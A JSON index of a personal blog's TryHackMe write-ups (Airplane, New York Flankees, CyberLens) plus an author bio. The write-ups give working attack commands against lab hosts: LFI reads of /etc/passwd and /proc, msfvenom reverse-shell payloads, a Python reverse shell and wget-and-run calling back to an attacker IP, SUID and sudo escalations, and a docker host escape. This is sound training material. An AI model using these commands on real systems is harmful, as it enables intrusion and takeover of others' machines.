Starting Script(s) [\u0026gt;] Running script \u0026#34;nmap -vvv -p {{port}} {{ip}} -sC -sV\u0026#34; on ip 10.10.249.133 PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 60 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 b8:64:f7:a9:df:29:3a:b5:8a:58:ff:84:7c:1f:1a:b7 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCuy7X5e34bStIhDkjJIcUT3kqFt9fHoI/q8AaCCH6HqgOz2HC5GdcDiBN8W6JMoRIIDJO/9FHiFE+MNtESwOP9J+S348GOhUIsVhDux7caJiyJQElrKxXJgxA7DNUvVJNBUchhgGhFv/qCNbUYF8+uaTYc0o/HtvgVw+t/bxS6EO+OlAOpyAjUP5XZjGTyc4n4uCc8mYW6aQHXZR0t5lMaKkNJzXl5+kHxxxnKci6+Ao8vrlKshgIq25NErSqoeTs/wgBcPMkr5r++emLH+rDwmjrTvwrHb2/bKKUenvnbf9AZXbcN52nGthVi95kP6HaDGijXULjrRt2GCul99OmNhEQxJNtLmUnxpxA9ZhBEzMYe3z5EeIbLuA+E9yFSrR6nq2pagC2/qvVMJSAzD749AbwjtbcL8MOf+7DCT+SATY9VxBqtKep/9PDolKi5+prGH6gzfjCkj5YaFS2CvJeGlF/B1XBzd1ccm43Lc4Ad/F4kvQWwkHmpL38kDy4eWCE= | 256 ad:61:3e:c7:10:32:aa:f1:f2:28:e2:de:cf:84:de:f0 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLYVoN15q7ky/IIo3VNrL35GRCpppImVs7x+PPFRlqO+VcfQ8C+MR2zVEFS0wosQWQFXaCZiInQhWz9swfKN6J8= | 256 a9:d8:49:aa:ee:de:c4:48:32:e4:f1:9e:2a:8a:67:f0 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFIB0hj2IqNazZojgwv0jJr+ZnOF1RCzykZ7W3jKsuCb 6048/tcp open x11? syn-ack ttl 60 8000/tcp open http-alt syn-ack ttl 60 Werkzeug/3.0.2 Python/3.8.10 |_http-title: Did not follow redirect to http://airplane.thm:8000/?page=index.html | http-methods: |_ Supported Methods: OPTIONS HEAD GET |_http-server-header: Werkzeug/3.0.2 Python/3.8.10 | fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 404 NOT FOUND | Server: Werkzeug/3.0.2 Python/3.8.10 | Date: Sun, 04 Aug 2024 12:42:27 GMT | Content-Type: text/html; charset=utf-8 | Content-Length: 207 | Connection: close | \u0026lt;!doctype html\u0026gt; | \u0026lt;html lang=en\u0026gt; | \u0026lt;title\u0026gt;404 Not Found\u0026lt;/title\u0026gt; | \u0026lt;h1\u0026gt;Not Found\u0026lt;/h1\u0026gt; | \u0026lt;p\u0026gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.\u0026lt;/p\u0026gt; | GetRequest: | HTTP/1.1 302 FOUND | Server: Werkzeug/3.0.2 Python/3.8.10 | Date: Sun, 04 Aug 2024 12:42:21 GMT | Content-Type: text/html; charset=utf-8 | Content-Length: 269 | Location: http://airplane.thm:8000/?page=index.html | Connection: close | \u0026lt;!doctype html\u0026gt; | \u0026lt;html lang=en\u0026gt; | \u0026lt;title\u0026gt;Redirecting...\u0026lt;/title\u0026gt; | \u0026lt;h1\u0026gt;Redirecting...\u0026lt;/h1\u0026gt; | \u0026lt;p\u0026gt;You should be redirected automatically to the target URL: \u0026lt;a href=\u0026#34;http://airplane.thm:8000/?page=index.html\u0026#34;\u0026gt;http://airplane.thm:8000/?page=index.html\u0026lt;/a\u0026gt;. If not, click the link. | Socks5: | \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//W3C//DTD HTML 4.01//EN\u0026#34; | \u0026#34;http://www.w3.org/TR/html4/strict.dtd\u0026#34;\u0026gt; | \u0026lt;html\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta http-equiv=\u0026#34;Content-Type\u0026#34; content=\u0026#34;text/html;charset=utf-8\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;Error response\u0026lt;/title\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body\u0026gt; | \u0026lt;h1\u0026gt;Error response\u0026lt;/h1\u0026gt; | \u0026lt;p\u0026gt;Error code: 400\u0026lt;/p\u0026gt; | \u0026lt;p\u0026gt;Message: Bad request syntax (\u0026#39; | \u0026#39;).\u0026lt;/p\u0026gt; | \u0026lt;p\u0026gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.\u0026lt;/p\u0026gt; | \u0026lt;/body\u0026gt; |_ \u0026lt;/html\u0026gt; Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ** Info ** port service 22 ssh 6048 unknown 8000 web application OS : Linux Here port 8000 is interesting.\nAirplane: Home page This is a website with simple blog about the airplanes. airplane.thm:8000 redirects to airplane.thm:8000/?page=index.html A simple web search give us the vulnerability information about the version Werkzeug/3.0.2 Python/3.8.10. Google Search: Werkzeug/3.0.2 Lets try to exploit it using Werkzeug - \u0026lsquo;Debug Shell\u0026rsquo; Command Execution .\n$ python2 exploit.py airplane.thm 8000 10.10.10.1 1234 [-] Debug is not enabled When used exploitdb result to make Debug Shell Command Execution, it failed. Lets proceed to next step.\nLets fuzz the fles/directories\n$ ffuf -c -u http://airplane.thm:8000/FUZZ -w /usr/share/wordlists/dirb/big.txt airplane [Status: 200, Size: 655, Words: 33, Lines: 36, Duration: 171ms] airplane.thm:8000/airplane is just a simple animation, not useful.\nffuf -u http://airplane.thm:8000/ -H \u0026#34;HOST: FUZZ.airplane.thm\u0026#34; -w /usr/share/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt --mc 200 Checked vhosts but nothing interesting found.\nNessus Nessus Web App scan result Used Nessus Web Application scaner and found LFI vulnerability.\ncurl http://airplane.thm:8000/?page=../../../../../../../../etc/passwd \u0026gt; passwd $ grep /bin/bash passwd root:x:0:0:root:/root:/bin/bash carlos:x:1000:1000:carlos,,,:/home/carlos:/bin/bash hudson:x:1001:1001::/home/hudson:/bin/bash Found 3 usernames: root, carlos, hudson.\nexport filename=users.txt echo root \u0026gt; $filename \u0026amp;\u0026amp; echo carlos \u0026gt;\u0026gt; $filename \u0026amp;\u0026amp; echo hudson \u0026gt;\u0026gt; $filename Lets start brutforcing ssh with the usernames.\nhydra -L users.txt -P /usr/share/wordlists/rockyou.txt airplane.thm ssh No useful results found.\nLets use LFI to gather more information.\n/proc/ $ curl http://airplane.thm:8000/?page=../../../../../../../../proc/self/environ --output - LANG=en_US.UTF-8LC_ADDRESS=tr_TR.UTF-8LC_IDENTIFICATION=tr_TR.UTF-8LC_MEASUREMENT=tr_TR.UTF-8LC_MONETARY=tr_TR.UTF-8LC_NAME=tr_TR.UTF-8LC_NUMERIC=tr_TR.UTF-8LC_PAPER=tr_TR.UTF-8LC_TELEPHONE=tr_TR.UTF-8LC_TIME=tr_TR.UTF-8PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/binHOME=/home/hudsonLOGNAME=hudsonUSER=hudsonSHELL=/bin/bashINVOCATION_ID=b6661084f65743da8c323f7d0963e579JOURNAL_STREAM=9:20506 From USER=hudson in the above result, we confirmed that LFI is possible as user hudson.\n$ curl http://airplane.thm:8000/?page=../../../../../../../../proc/self/cmdline --output - /usr/bin/python3app.py # The /proc/self/cmdline file in the Linux /proc filesystem contains the command-line arguments that were used to start the currently executing process. The current process is executed by running /usr/bin/python3 app.py in the target system by victim user.\n$ curl http://airplane.thm:8000/?page=../../../../../../../../proc/sched_debug --output - | grep airplane runnable tasks: S task PID tree-key switches prio wait-time sum-exec sum-sleep ----------------------------------------------------------------------------------------------------------- t airplane 580 14.246406 5 120 0.000000 1.842503 0.000000 0 0 /autogroup-73 # using /proc/sched_debug to check for interesting running processes. While checking the processes running in the system, found a process called airplane with PID:580.\n$ curl http://airplane.thm:8000/?page=../../../../../../../../proc/580/cmdline --output - /opt/airplane Process airplane is started from /opt/airplane.\n$ curl http://airplane.thm:8000/?page=../../../../../../../../proc/580/stat --output - 580 (airplane) t 531 580 531 0 -1 1073741824 132 0 0 0 0 0 0 0 20 0 1 0 1618 364544 1 18446744073709551615 93824992231424 93824992236021 140737488350208 0 0 0 0 4096 0 1 0 0 17 1 0 0 6 0 0 93824992247224 93824992247824 93824992251904 140737488350742 140737488350756 140737488350756 140737488351210 0 Checking the status of PID 580 (airplane) we got the parent process PID 531.\n$ curl http://airplane.thm:8000/?page=../../../../../../../../proc/531/cmdline --output - /usr/bin/gdbserver0.0.0.0:6048airplane While checking the status of PID 531, we got that /usr/bin/gdbserver is being run in port 6048.\nExploitation Hacktricks: GdbServer From Hacktricks: GdbServer we got some info about gdbserver, and exploitation techniques. Lets follow that.\nnc -nvlp 4444 Start a netcat listener at port 4444.\n# Update your local ip in the place of 10.10.10.1 msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 PrependFork=true -f elf -o binary.elf chmod +x binary.elf # install gdb if not exist using \u0026#34;sudo apt install gdb\u0026#34; gdb binary.elf # Set remote debuger target target extended-remote airplane.thm:6048 # Upload elf file remote put binary.elf /tmp/binary.elf # Set remote executable file set remote exec-file /tmp/binary.elf # Execute reverse shell executable run # You should get your reverse-shell This is the exploit command modified from Hacktricks:Gdbserver-exploit . By running the above commands, got reverse shell as user hudson.\npython3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; ^Z #(Ctrl+Z) stty raw -echo \u0026amp;\u0026amp; fg export TERM=xterm Got stable shell by running above commands.\n$ find / -type f -perm -04000 -ls 2\u0026gt;/dev/null 262477 316 -rwsr-xr-x 1 carlos carlos 320160 Feb 18 2020 /usr/bin/find While checking for SUID binary found a useful hit, we can run /usr/bin/find as user carlos. Lets use GTFOBins:find to get the privilege of user carlos.\nLateral Movement $ /usr/bin/find . -exec /bin/sh -p \\; -quit # exploiting the SUID binary find $ id uid=1001(hudson) gid=1001(hudson) euid=1000(carlos) groups=1001(hudson) Now we can run commands as user carlos. We dont have interactive shell now, lets use ssh for getting better shell.\nssh-keygen -t rsa -f id_rsa -b 4096 -C \u0026#39;\u0026#39; -N \u0026#39;\u0026#39; Run the above command to generate a SSH key pair in local machine.\necho \u0026#39;contents_of_id_rsa.pub\u0026#39; \u0026gt; /home/carlos/.ssh/authorized_keys Run the above command in remote machine. This will make the key trusted for ssh connection.\nssh carlos@airplane.thm -i id_rsa Running the above command we got ssh connection as user carlos with better shell.\nPrivilege Escalation carlos@airplane:~$ id uid=1000(carlos) gid=1000(carlos) groups=1000(carlos),27(sudo) carlos@airplane:~$ sudo -l Matching Defaults entries for carlos on airplane: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User carlos may run the following commands on airplane: (ALL) NOPASSWD: /usr/bin/ruby /root/*.rb From the above results we are able to run /usr/bin/ruby /root/*.rb as root using sudo command.\necho \u0026#39;exec \u0026#34;/bin/sh\u0026#34;\u0026#39; \u0026gt; /tmp/exploit.rb sudo /usr/bin/ruby /root/../tmp/exploit.rb Created exploit.rb using hint from Hacktricks: ruby-sudo . Here ../ means previous directory by 1 step. /root/../ is equal to / directory. Thus we can use the file /tmp/exploit.rb by the path /root/../tmp/exploit.rb. We got root access by running the above command.\ncat /home/carlos/user.txt /root/root.txt We got user and root flags by running the above commands.\nHappy Hacking !!! \u0026#x1f60e;\n","permalink":"https://cyberjagadeesh.github.io/posts/airplane/writeup/","tags":["ffuf","nessus","lfi","/proc","gdbserver","msfvenom","betterShell","SUID","ssh-keygen"],"title":"Airplane | THM Writeup"},{"categories":["CTF"],"content":"Introduction Detailed walkthrough for New York Flankees CTF challenges on TryHackMe .\nTools Used rustscan, burpsuite\nEnumeration Lets start the process by mapping host-name to target IP address.\nsudo echo \u0026#34;10.10.140.44 nythm.com\u0026#34; \u0026gt;\u0026gt; /etc/hosts Let\u0026rsquo;s start enumaration process using rustscan portscanner.\nrustscan -a nythm.com -- -sC -sV .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-\u0026#39; `-\u0026#39;`-----\u0026#39;`----\u0026#39; `-\u0026#39; `----\u0026#39; `---\u0026#39; `-\u0026#39; `-\u0026#39;`-\u0026#39; `-\u0026#39; The Modern Day Port Scanner. _______________________________________ Open 10.10.140.44:22 Open 10.10.140.44:8080 [~] Starting Script(s) [\u0026gt;] Running script \u0026#34;nmap -vvv -p {{port}} {{ip}} -sC -sV\u0026#34; on ip 10.10.140.44 PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 60 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 86:03:99:d9:07:c6:f5:8c:48:11:b7:56:58:fe:72:06 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAHznW6yrO1o2or52QbWKmOLRYEcbWUD2zy0gHcYzw2sqhx9U/pJxJOa5Z0fwuMVPjRtqGLOk3EOrBnQ6LstnOyGx0KUsBn3c/hSHNCS9uzVbDzikf6ffQLw0hAcJzSi1EsQDRkeyJ24NuzhQ9RXKO1R1Gr0RB4AcmvIoNspcxV0KTiTOIWuAPiJLiZtsOSS39zghuRjvWwnWQ3jR0X2r5NPjphojx3pKxlDNhf9gpaz2kck/Jv8cfktisANej2q4JY+BEL9VaxyBV8DOq/WU9E8TvIGYEK1sOh1UKCl7JgKBbA+30Wge+/EsiV/zEQooDQvNUT5YgUwCCAdClLYxR996glhDywuGYIAOE/VIP69k0JAbkZy8kwP22t0ZHunJrFaPWL5iw++O6/NKTL2xQXwAmKZu81B7Un3Q35lal7k6YO9agJJ4oxD7z15Ee+eJf4KxSOYhSA89KhDQSbrkpZKMyuJ6uoJHXVVyZmMRO2IaraJaY156vZxe9fkOyLvE= | 256 0e:b9:fd:e8:8a:7c:fc:b9:91:b0:3d:0d:16:c9:43:3c (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN1JAvVFTNHO87FGw+Q3NxpS0st1TbH9/Tn+PLJMBdVQ/NHeBZSdt/954gYSL6c0Plt8YiuVswjf//DSHz1rff0= | 256 9c:be:88:a2:44:56:2b:ba:dd:b9:5a:da:f2:24:8a:f5 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILwrt82psPblgKYPcZ1VkSr/bVktYgYaVX+zqGdFFrwK 8080/tcp open http syn-ack ttl 59 Octoshape P2P streaming web service |_http-title: Hello world! | http-methods: |_ Supported Methods: GET |_http-favicon: Unknown favicon MD5: 6FD74A43E6C5F7502642326FAB0B3E69 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel From the above results we found 2 open ports 22(ssh) and 8080(web server) and the operating system is Linux. Starting with port 8080.\nHome Page This is a blog website of user Stefan. Here the word Oracle is highlighted 2 times using bold text and image. So, must be using one of the Oracle services.\nAdmin Login Page This website have an admin login page which will use it in future, as we need to enumarate further to get hints about username or password.\nDebug page This website also have an Dubug page, which is giving hints about Implementation of custom authentication mechanism and verbose error (padding).\nview-source of home page We found a script in the page while checking the source of the page.\nadding cookie using cookie editor extension Tried to bypass the login by adding the loggedin cookie using cookie editor[firefox extension], but exec.html page gives error.\nInspect: debug.html page Checking network history of debug.html page, found one interesting request trying to connect to its localhost. Lets change its host to its webserver address.\nchanging the host using Burpsuite Changing the host of the request to web server address gives us response: Custom authentication success.\nmodifying the url using Burpsuite When modifying the string after /api/debug/ in the request, we got an error: Decryption error as a response. This informs there is some cryptography is being used here. So, I tried to decrypt the string below\n39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EF4 using various decryption tools, but none of those helped. Proceeding further.\nPadding Oracle Google Search After multiple attempts of Google search using hints we have, found an interesting result.\nPadding Oracle - HackTricks Padding Oracle - HackTricks : The same behaviour (error when modifing the value) we observed in /api/debug/ request. By this point we got that the web application is vulnerable to padding oracle vulnerability.\nExploitation Found multiple exploit codes for this vulnerability when googling it. Search term used padding oracle vulnerability exploit github. Two exploits I\u0026rsquo;ve used are below.\nmpgn/Padding-oracle-attack - slow and detailed python exploit.py -c 39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EF4 -l 16 --host nythm.com:8080 -u /api/debug/ --error \u0026#34;Decryption error\u0026#34; glebarez/padre - binary - fast chmod +x padre-linux-amd64 ./padpadre-linux-amd64re -u \u0026#39;http://nythm.com:8080/api/debug/$\u0026#39; -e lhex 39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EF4 The above exploits will give the username and password in the format username:password, which is the flag1 of this lab.\nAdmin login lets use the username:password combination to login the admin panel.\nSuccessful Addmin login Kudos!!! \u0026#x1f929; We found the flag2. There is a command box and a submit button which we might be useful to get reverse shell. Lets check its behaviour.\nExecuting valid command Executing valid command gives OK response.\nExecuting invalid command Executing invalid command gives empyt response. Lets use this behaviour to get reverse shell code.\nReverse Shell python3 -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.11.10.99\u0026#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\u0026#34;sh\u0026#34;)\u0026#39; # Replace the LHOST(10.11.10.99) with your local ip. Using Reverse Shell Generator to get reverse shell commands, and confirming the valid command using response from the command. The above command gives OK response, means working without any errors. But not getting reverse shell connection. So, creating a shell script exploit.sh in local machine which will be usefull for reverse shell. The contents of the script exploit.sh should be the above command.\nnc -nvlp 1234 Setting up the listener in local machine using the above command in the port 1234.\npython -m http.server 8000 Starting Python HTTP Server in the directory of exploit.sh script, to transfer it to the target system. This will start the http server in port 8000.\nwget http://10.11.10.99:8000/exploit.sh chmod +x exploit.sh ./exploit.sh # Replace 10.11.10.99 your local ip address. # The above commands should be runned individually. Running the above commands in exec.html makes reverse shell. Now we are in the target system as root user.\u0026#x1f60e;\nInteractive shell python3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; ^Z #(Ctrl+z) stty raw -echo \u0026amp;\u0026amp; fg export TERM=xterm Got Interactive shell by running the above commands.\nLets enumarate the files in the target system for next flag. Found an interesting directory /app/.\nroot@02e849f307cc:/app# ls Dockerfile gradle ktor-docker-sample.jar README.md gradle.properties settings.gradle.kts build.gradle.kts gradlew src docker-compose.yml gradlew.bat root@02e849f307cc:/app# cat README.md # README * To get started, simply run `docker-compose up` Directory /app/ contains files related to docker. We can also found README.md file which is pointing to docker-compose file. Viewing the contents of /app/docker-compose.yml we got the next flag3.\nLets check for the docker, and run it if exits.\nDocker root@02e849f307cc:/# docker images REPOSITORY TAG IMAGE ID CREATED SIZE padding-oracle-app_web latest cd6261dd9dda 2 months ago 1.01GB \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; 4187efabd0a5 2 months ago 704MB gradle 7-jdk11 d5954e1d9fa4 3 months ago 687MB openjdk 11 47a932d998b7 2 years ago 654MB root@02e849f307cc:/# docker run -it -v /:/host/ 47a932d998b7 chroot /host/ bash root@e62f1c047af3:/# ls bin dev flag.txt lib lib64 lost+found mnt proc run snap sys usr boot etc home lib32 libx32 media opt root sbin srv tmp var root@e62f1c047af3:/# cat flag.txt THM{FLAG} There were 4 docker images available on the system. While trying to run one of the docker, we got interactive shell in it. Here we got the flag4.\nThis is end of the lab \u0026#x1f36d;\nHappy Hacking!!!\u0026#x1f47d;\n","permalink":"https://cyberjagadeesh.github.io/posts/thenewyorkflankees/writeup/","tags":["Oracle padding","Docker"],"title":"New York Flankees | THM Writeup"},{"categories":["CTF"],"content":"Introduction Detailed walkthrough for CyberLens CTF challenges on TryHackMe .\nTools Used rustscan, ping, burpsuite, nc, metasploit, msfvenom.\nEnumeration Lets start the process by mapping host-name to target IP address. mapping cyberlens.thm to the target IP address When any user or application on the system tries to access cyberlens.thm, it will be directed to the IP address specified in the /etc/hosts file. Lets use rustscan for port scanning the target domain. Rustscan is tool to scan the network ports faster.\nrustscan -a cyberlens.thm -- -sC -sV # -a - IPs, or hosts to be scanned # -- -sC -sV - this command adds -sC -sV automatically to nmap #[Eg: nmap -sC -sV cyberlens.thm] rustscan of cyberlens.thm Found 16 open ports on the initial scan of posts using rustscan. Lets wait for executing nmap -sC -sV cyberlens.thm scan. scan result of nmap -sC -sV cyberlens.thm We got service and default script scan results of the host. Found multiple open ports. Lets start with web service, which is running in port 80 and port 61777. We have also confirmed that the target machine is running Windows OS from the above results. cyberlens.thm This is the website to extract the metadata of the images. Lets try using its functionality. metadata result Lets capture its functionality using Burp-suite. Burp-suite capture By checking the burp-suite we know that its connecting to port 61777 to get the meta data of the image. cyberlens.thm:61777 Exploitation Apache Tika 1.17 Server is running in port 61777. Lets make a search about the server. search Apache Tika 1.17 Server Found an interesting git result, where there is detailed information about the vulnerability and its POC in Apache Tika 1.17 Server. Lets use this git page to exploit the vulnerability.\nLet\u0026rsquo;s test the python script from the git by uploading it.\npython -m http.server \u0026lt;port\u0026gt; # -m \u0026lt;module_name\u0026gt; - python module to be used python http.server lin tening in port 9037 certutil -urlcache -f \u0026lt;file_url\u0026gt; \u0026lt;output_file_name\u0026gt; # command to download a file from internet in Windows running exploit.py python script When we try to download a file exploit.py using the script from git, it was successfully downloaded in the target machine. Lets use this for the reverse shell. Getting reverse shell Uploading nc.exe and got reverse shell from it. And we are now logged in as user cyberlens in the target machine. flag 1 We got flag 1.\nPrivilege Escalation Lets start enumerate the system for privilege escalation vector using winPEASx64.exe . executing winPEASx64.exe Found an interesting result. AlwaysInstallElevated Privilege Escalation vector Lets check about it in internet. about AlwaysInstallElevated Found an interesting page where we get information about AlwaysInstallElevated. If .msi file is executed, it will be running with administrator privilege.\nLets create a .msi file to get reverse shell with elevated Privileges.\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=\u0026lt;local_ip\u0026gt; lport=\u0026lt;local_port\u0026gt; -a x64 --platform windows -f msi -o payload.msi # -p - payload to use # -a - The architecture to useitecture # --platform - The platform of the payload # -f - Output format # -o - Save the payload as Lets generate and upload the payload to get reverse shell. getting reverse shell with elevated privs We have generated .msi file using msfvenom, uploaded and executed to get reverse shell as user nt authority\\system. flag 2 We got flag 2.\nAlternate Solution using Metasploit We know that vulnerable web application running apache tika. lets search it. Exploit using Metasploit Using the module exploit/windows/http/apache_tika_jp2_jscript, setting rhosts, rport, lhost and running the module. We confirmed that the target is vulnerable and exploitable. getting meterpreter as CyberLens We got the meterpreter session for the payload. Making this session to background using background command to proceed further. Privilege Escalation using Metasploit Searching AlwaysInstallElevated for privilege escalation in metasploit and got a result windows/local/always_install_elevated.\nSetting session, rhosts, rport, lhost and running the module. We got a new session as user NT AUTHORITY\\SYSTEM, which is highest privilege user in windows.\nFinally we have completed the room Cyberlens.\nHappy Hacking!!!\n","permalink":"https://cyberjagadeesh.github.io/posts/cyberlens/writeup/","tags":["CVE-2018-1335","AlwaysInstallElevated","msi","apache_tika","metasploit","msfvenom"],"title":"CyberLens CTF |THM Writeup"},{"categories":null,"content":"","permalink":"https://cyberjagadeesh.github.io/manifest.json","tags":null,"title":""},{"categories":null,"content":"","permalink":"https://cyberjagadeesh.github.io/search/_index.de/","tags":null,"title":""},{"categories":null,"content":"","permalink":"https://cyberjagadeesh.github.io/search/_index.es/","tags":null,"title":""},{"categories":null,"content":"","permalink":"https://cyberjagadeesh.github.io/search/_index.fr/","tags":null,"title":""},{"categories":null,"content":"","permalink":"https://cyberjagadeesh.github.io/search/_index.hi/","tags":null,"title":""},{"categories":null,"content":"","permalink":"https://cyberjagadeesh.github.io/search/_index.jp/","tags":null,"title":""},{"categories":null,"content":"","permalink":"https://cyberjagadeesh.github.io/search/_index.nl/","tags":null,"title":""},{"categories":null,"content":"","permalink":"https://cyberjagadeesh.github.io/search/_index.pl/","tags":null,"title":""},{"categories":null,"content":"","permalink":"https://cyberjagadeesh.github.io/search/_index.ru/","tags":null,"title":""},{"categories":null,"content":"","permalink":"https://cyberjagadeesh.github.io/search/_index.zh-cn/","tags":null,"title":""},{"categories":null,"content":"About Me Hii there,\nA little about myself:\nI am Jagadeeshwaran, @CyberJagadeesh. With a strong foundation in Android Application Reverse Engineering built over 3 years, I have developed a keen eye for understanding how apps function and identifying potential vulnerabilities. My passion extends to the broader realm of cybersecurity, where I specialize in penetration testing with a particular focus on web application security and network vulnerability assessments. To stay at the forefront of the field, I am dedicated to continuous learning, actively participating in CTF challenges, and expanding my skill set to include DAST (Dynamic Application Security Testing). As an eJPT certified professional, I am committed to safeguarding digital assets and collaborating with others to build a more secure digital landscape.\nMy expertise lies in dissecting Android applications to uncover hidden functionalities and weaknesses. This knowledge, coupled with my proficiency in penetration testing, allows me to identify and mitigate potential threats to digital systems. I am constantly seeking new challenges and opportunities to enhance my skill set. By combining my technical abilities with a passion for problem-solving, I strive to be a valuable asset in any cybersecurity team.\nTryHackMe Profile ","permalink":"https://cyberjagadeesh.github.io/about/","tags":null,"title":"whoami"}]